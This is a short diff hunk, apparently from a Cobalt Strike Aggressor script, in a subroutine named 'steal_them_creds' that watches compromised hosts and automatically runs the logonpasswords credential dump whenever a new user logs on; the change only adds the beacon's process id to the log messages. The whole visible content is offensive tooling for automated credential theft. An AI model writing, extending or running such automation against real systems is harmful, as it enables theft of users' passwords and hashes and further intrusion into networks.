@@ -89,11 +89,11 @@ sub steal_them_creds {
 	foreach $bid (@watchlist) {
 		get_users($bid, {
 			if ( $2 ) {
-				println("New user! Running logonpasswords in " . $1);
+				println("New user! Running logonpasswords in " . beacon_info($1, "pid"));
 				blogonpasswords($1);
 			}
 			else {
-				println("No new users in " . $1);
+				println("No new users in " . beacon_info($1, "pid"));
 			}
 		});
 	}
